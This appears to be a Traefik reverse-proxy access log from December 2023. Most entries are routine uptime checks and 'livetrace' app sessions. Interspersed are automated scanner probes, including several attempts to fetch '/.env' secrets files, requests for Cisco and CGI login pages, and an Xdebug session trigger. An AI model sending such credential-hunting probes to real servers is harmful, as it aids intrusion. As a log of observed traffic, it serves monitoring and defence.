167.71.120.76 - - [15/Dec/2023:05:35:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5051 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:05:36:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5052 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:05:36:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5053 "www@docker" "http://172.25.0.8:80" 0ms
35.178.157.24 - - [15/Dec/2023:05:37:15 +0000] "GET /+CSCOE+/logon.html HTTP/1.1" 404 19 "-" "-" 5054 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:05:37:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5055 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:05:37:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5056 "www@docker" "http://172.25.0.8:80" 0ms
35.178.157.24 - - [15/Dec/2023:05:37:59 +0000] "GET /+CSCOE+/logon.html HTTP/1.1" 301 17 "-" "-" 5057 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:05:38:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5058 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:05:38:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5059 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:05:39:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5060 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:05:39:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5061 "www@docker" "http://172.25.0.8:80" 0ms
35.178.157.24 - - [15/Dec/2023:05:40:19 +0000] "GET /cgi-bin/login.cgi HTTP/1.1" 404 19 "-" "-" 5062 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:05:40:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5063 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:05:40:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5064 "www@docker" "http://172.25.0.8:80" 1ms
35.178.157.24 - - [15/Dec/2023:05:41:02 +0000] "GET /cgi-bin/login.cgi HTTP/1.1" 301 17 "-" "-" 5065 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:05:41:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5066 "www@docker" "http://172.25.0.8:80" 1ms
4.26.29.194 - - [15/Dec/2023:05:41:33 +0000] "GET /trace/ HTTP/2.0" 200 2064 "-" "-" 5067 "livetrace@docker" "http://172.25.0.5:80" 9ms
4.26.29.194 - - [15/Dec/2023:05:41:34 +0000] "GET /trace/start.php?id=3sps6gh1g HTTP/2.0" 200 101 "-" "-" 5068 "livetrace@docker" "http://172.25.0.5:80" 3ms
4.26.29.194 - - [15/Dec/2023:05:41:35 +0000] "GET /trace/poll.php?id=3sps6gh1g HTTP/2.0" 200 87 "-" "-" 5069 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:05:41:36 +0000] "GET /trace/poll.php?id=3sps6gh1g HTTP/2.0" 200 87 "-" "-" 5070 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:05:41:37 +0000] "GET /trace/poll.php?id=3sps6gh1g HTTP/2.0" 200 88 "-" "-" 5071 "livetrace@docker" "http://172.25.0.5:80" 1ms
167.71.120.76 - - [15/Dec/2023:05:41:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5072 "www@docker" "http://172.25.0.8:80" 0ms
4.26.29.194 - - [15/Dec/2023:05:41:38 +0000] "GET /trace/poll.php?id=3sps6gh1g HTTP/2.0" 200 88 "-" "-" 5073 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:05:41:39 +0000] "GET /trace/poll.php?id=3sps6gh1g HTTP/2.0" 200 88 "-" "-" 5074 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:05:41:40 +0000] "GET /trace/poll.php?id=3sps6gh1g HTTP/2.0" 200 88 "-" "-" 5075 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:05:41:41 +0000] "GET /trace/poll.php?id=3sps6gh1g HTTP/2.0" 200 101 "-" "-" 5076 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:05:41:41 +0000] "GET /trace/cleanup.php?id=3sps6gh1g HTTP/2.0" 200 71 "-" "-" 5077 "livetrace@docker" "http://172.25.0.5:80" 3ms
159.203.109.206 - - [15/Dec/2023:05:42:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5078 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:05:42:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5079 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:05:43:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5080 "www@docker" "http://172.25.0.8:80" 0ms
35.178.157.24 - - [15/Dec/2023:05:43:32 +0000] "GET /logon.htm HTTP/1.1" 404 19 "-" "-" 5081 "-" "-" 0ms
167.71.120.76 - - [15/Dec/2023:05:43:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5082 "www@docker" "http://172.25.0.8:80" 0ms
35.178.157.24 - - [15/Dec/2023:05:44:15 +0000] "GET /logon.htm HTTP/1.1" 301 17 "-" "-" 5083 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:05:44:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5084 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:05:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5085 "www@docker" "http://172.25.0.8:80" 0ms
64.62.197.204 - - [15/Dec/2023:05:45:13 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 5086 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:05:45:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5087 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:05:45:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5088 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:05:46:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5089 "www@docker" "http://172.25.0.8:80" 1ms
57.129.23.166 - - [15/Dec/2023:05:46:28 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 5090 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [15/Dec/2023:05:46:28 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 5091 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:05:46:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5092 "www@docker" "http://172.25.0.8:80" 0ms
64.62.197.206 - - [15/Dec/2023:05:46:38 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 5093 "web-to-websecure@internal" "-" 0ms
64.62.197.201 - - [15/Dec/2023:05:46:38 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 5094 "-" "-" 0ms
35.178.157.24 - - [15/Dec/2023:05:46:39 +0000] "GET /login.jsp HTTP/1.1" 404 19 "-" "-" 5095 "-" "-" 0ms
64.62.197.205 - - [15/Dec/2023:05:47:11 +0000] "GET /favicon.ico HTTP/1.1" 301 17 "-" "-" 5096 "web-to-websecure@internal" "-" 0ms
35.178.157.24 - - [15/Dec/2023:05:47:22 +0000] "GET /login.jsp HTTP/1.1" 301 17 "-" "-" 5097 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:05:47:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5098 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:05:47:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5099 "www@docker" "http://172.25.0.8:80" 1ms
64.62.197.209 - - [15/Dec/2023:05:47:46 +0000] "GET /geoserver/web/ HTTP/1.1" 301 17 "-" "-" 5100 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:05:48:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5101 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:05:48:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5102 "www@docker" "http://172.25.0.8:80" 0ms
167.248.133.182 - - [15/Dec/2023:05:49:14 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 5103 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:05:49:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5104 "www@docker" "http://172.25.0.8:80" 23ms
167.71.120.76 - - [15/Dec/2023:05:49:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5105 "www@docker" "http://172.25.0.8:80" 19ms
35.178.157.24 - - [15/Dec/2023:05:50:01 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 5106 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:05:50:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5107 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:05:50:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5108 "www@docker" "http://172.25.0.8:80" 1ms
83.97.73.87 - - [15/Dec/2023:05:50:43 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 17 "-" "-" 5109 "web-to-websecure@internal" "-" 0ms
83.97.73.87 - - [15/Dec/2023:05:50:46 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 19 "-" "-" 5110 "-" "-" 0ms
35.178.157.24 - - [15/Dec/2023:05:50:53 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 5111 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:05:51:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5112 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:05:51:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5113 "www@docker" "http://172.25.0.8:80" 1ms
4.26.29.194 - - [15/Dec/2023:05:51:39 +0000] "GET /trace/ HTTP/2.0" 200 2240 "-" "-" 5114 "livetrace@docker" "http://172.25.0.5:80" 33ms
4.26.29.194 - - [15/Dec/2023:05:51:39 +0000] "GET /trace/styles.css?version=0.7 HTTP/2.0" 200 1304 "-" "-" 5115 "livetrace@docker" "http://172.25.0.5:80" 0ms
4.26.29.194 - - [15/Dec/2023:05:51:43 +0000] "GET /trace/ HTTP/2.0" 200 2240 "-" "-" 5116 "livetrace@docker" "http://172.25.0.5:80" 15ms
4.26.29.194 - - [15/Dec/2023:05:51:45 +0000] "GET /trace/start.php?id=9w3a6wler HTTP/2.0" 200 101 "-" "-" 5117 "livetrace@docker" "http://172.25.0.5:80" 3ms
4.26.29.194 - - [15/Dec/2023:05:51:46 +0000] "GET /trace/poll.php?id=9w3a6wler HTTP/2.0" 200 87 "-" "-" 5118 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:05:51:47 +0000] "GET /trace/poll.php?id=9w3a6wler HTTP/2.0" 200 87 "-" "-" 5119 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:05:51:49 +0000] "GET /trace/poll.php?id=9w3a6wler HTTP/2.0" 200 88 "-" "-" 5120 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:05:51:50 +0000] "GET /trace/poll.php?id=9w3a6wler HTTP/2.0" 200 88 "-" "-" 5121 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:05:51:51 +0000] "GET /trace/poll.php?id=9w3a6wler HTTP/2.0" 200 88 "-" "-" 5122 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:05:51:51 +0000] "GET /trace/poll.php?id=9w3a6wler HTTP/2.0" 200 88 "-" "-" 5123 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:05:51:52 +0000] "GET /trace/poll.php?id=9w3a6wler HTTP/2.0" 200 88 "-" "-" 5124 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:05:51:53 +0000] "GET /trace/poll.php?id=9w3a6wler HTTP/2.0" 200 101 "-" "-" 5125 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:05:51:53 +0000] "GET /trace/cleanup.php?id=9w3a6wler HTTP/2.0" 200 71 "-" "-" 5126 "livetrace@docker" "http://172.25.0.5:80" 3ms
4.26.29.194 - - [15/Dec/2023:05:52:19 +0000] "GET /trace/ HTTP/2.0" 200 2240 "-" "-" 5127 "livetrace@docker" "http://172.25.0.5:80" 7ms
159.203.109.206 - - [15/Dec/2023:05:52:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5128 "www@docker" "http://172.25.0.8:80" 0ms
4.26.29.194 - - [15/Dec/2023:05:52:27 +0000] "GET / HTTP/2.0" 304 0 "-" "-" 5129 "www@docker" "http://172.25.0.8:80" 18ms
4.26.29.194 - - [15/Dec/2023:05:52:27 +0000] "GET /styles.css HTTP/2.0" 499 21 "-" "-" 5130 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:05:52:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5131 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:05:53:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5132 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:05:53:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5133 "www@docker" "http://172.25.0.8:80" 1ms
4.26.29.194 - - [15/Dec/2023:05:53:59 +0000] "GET /priv HTTP/2.0" 301 169 "-" "-" 5134 "www@docker" "http://172.25.0.8:80" 0ms
4.26.29.194 - - [15/Dec/2023:05:53:59 +0000] "GET /priv/ HTTP/1.1" 301 17 "-" "-" 5135 "web-to-websecure@internal" "-" 0ms
4.26.29.194 - - [15/Dec/2023:05:53:59 +0000] "GET /priv/ HTTP/2.0" 200 258 "-" "-" 5136 "www@docker" "http://172.25.0.8:80" 1ms
4.26.29.194 - - [15/Dec/2023:05:54:01 +0000] "GET /priv/test.txt HTTP/2.0" 200 47 "-" "-" 5137 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:05:54:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5138 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:05:54:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5139 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:05:55:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5140 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:05:55:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5141 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:05:56:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5142 "www@docker" "http://172.25.0.8:80" 0ms
173.48.140.140 - - [15/Dec/2023:05:56:28 +0000] "GET /trace/ HTTP/2.0" 200 2274 "-" "-" 5143 "livetrace@docker" "http://172.25.0.5:80" 167ms
173.48.140.140 - - [15/Dec/2023:05:56:28 +0000] "GET /trace/styles.css?version=0.7 HTTP/2.0" 304 0 "-" "-" 5144 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [15/Dec/2023:05:56:31 +0000] "GET /trace/start.php?id=y9y1vgjas HTTP/2.0" 200 104 "-" "-" 5145 "livetrace@docker" "http://172.25.0.5:80" 3ms
173.48.140.140 - - [15/Dec/2023:05:56:33 +0000] "GET /trace/poll.php?id=y9y1vgjas HTTP/2.0" 200 89 "-" "-" 5146 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [15/Dec/2023:05:56:34 +0000] "GET /trace/poll.php?id=y9y1vgjas HTTP/2.0" 200 89 "-" "-" 5147 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [15/Dec/2023:05:56:35 +0000] "GET /trace/poll.php?id=y9y1vgjas HTTP/2.0" 200 90 "-" "-" 5148 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [15/Dec/2023:05:56:36 +0000] "GET /trace/poll.php?id=y9y1vgjas HTTP/2.0" 200 90 "-" "-" 5149 "livetrace@docker" "http://172.25.0.5:80" 2ms
173.48.140.140 - - [15/Dec/2023:05:56:37 +0000] "GET /trace/poll.php?id=y9y1vgjas HTTP/2.0" 200 90 "-" "-" 5150 "livetrace@docker" "http://172.25.0.5:80" 1ms
167.71.120.76 - - [15/Dec/2023:05:56:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5151 "www@docker" "http://172.25.0.8:80" 0ms
173.48.140.140 - - [15/Dec/2023:05:56:38 +0000] "GET /trace/poll.php?id=y9y1vgjas HTTP/2.0" 200 90 "-" "-" 5152 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [15/Dec/2023:05:56:39 +0000] "GET /trace/poll.php?id=y9y1vgjas HTTP/2.0" 200 90 "-" "-" 5153 "livetrace@docker" "http://172.25.0.5:80" 2ms
173.48.140.140 - - [15/Dec/2023:05:56:40 +0000] "GET /trace/poll.php?id=y9y1vgjas HTTP/2.0" 200 99 "-" "-" 5154 "livetrace@docker" "http://172.25.0.5:80" 1ms
173.48.140.140 - - [15/Dec/2023:05:56:40 +0000] "GET /trace/cleanup.php?id=y9y1vgjas HTTP/2.0" 200 71 "-" "-" 5155 "livetrace@docker" "http://172.25.0.5:80" 2ms
159.203.109.206 - - [15/Dec/2023:05:57:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5156 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:05:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5157 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:05:58:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5158 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:05:58:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5159 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:05:59:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5160 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:05:59:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5161 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:00:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5162 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:06:00:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5163 "www@docker" "http://172.25.0.8:80" 0ms
95.214.235.169 - - [15/Dec/2023:06:01:20 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 5164 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [15/Dec/2023:06:01:21 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 5165 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:06:01:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5166 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:06:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5167 "www@docker" "http://172.25.0.8:80" 0ms
205.210.31.103 - - [15/Dec/2023:06:01:59 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 5168 "dashboard@internal" "-" 0ms
205.210.31.103 - - [15/Dec/2023:06:01:59 +0000] "GET /dashboard/ HTTP/1.1" 200 3124 "-" "-" 5169 "dashboard@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:06:02:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5170 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5171 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:03:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5172 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:03:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5173 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:04:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5174 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:04:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5175 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:05:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5176 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:05:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5177 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:06:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5178 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:06:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5179 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:06:07:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5180 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:07:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5181 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:08:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5182 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:08:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5183 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:09:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5184 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:09:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5185 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:06:10:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5186 "www@docker" "http://172.25.0.8:80" 0ms
143.110.222.166 - - [15/Dec/2023:06:10:28 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 5187 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:06:10:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5188 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:11:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5189 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:11:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5190 "www@docker" "http://172.25.0.8:80" 1ms
159.203.136.60 - - [15/Dec/2023:06:12:12 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 5191 "-" "-" 0ms
159.203.136.60 - - [15/Dec/2023:06:12:12 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 5192 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:06:12:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5193 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:12:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5194 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:13:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5195 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:13:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5196 "www@docker" "http://172.25.0.8:80" 0ms
143.110.222.166 - - [15/Dec/2023:06:13:42 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 5197 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:06:14:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5198 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:14:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5199 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:15:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5200 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:15:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5201 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:16:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5202 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:16:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5203 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:06:17:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5204 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:06:17:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5205 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:18:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5206 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:06:18:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5207 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:19:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5208 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:19:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5209 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:20:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5210 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:20:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5211 "www@docker" "http://172.25.0.8:80" 1ms
45.142.182.77 - - [15/Dec/2023:06:20:45 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 5212 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:06:21:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5213 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:21:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5214 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:22:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5215 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:06:22:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5216 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:23:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5217 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:06:23:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5218 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:24:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5219 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:06:24:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5220 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:06:25:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5221 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:06:25:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5222 "www@docker" "http://172.25.0.8:80" 1ms
57.129.23.166 - - [15/Dec/2023:06:26:03 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 5223 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [15/Dec/2023:06:26:03 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 5224 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:06:26:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5225 "www@docker" "http://172.25.0.8:80" 0ms
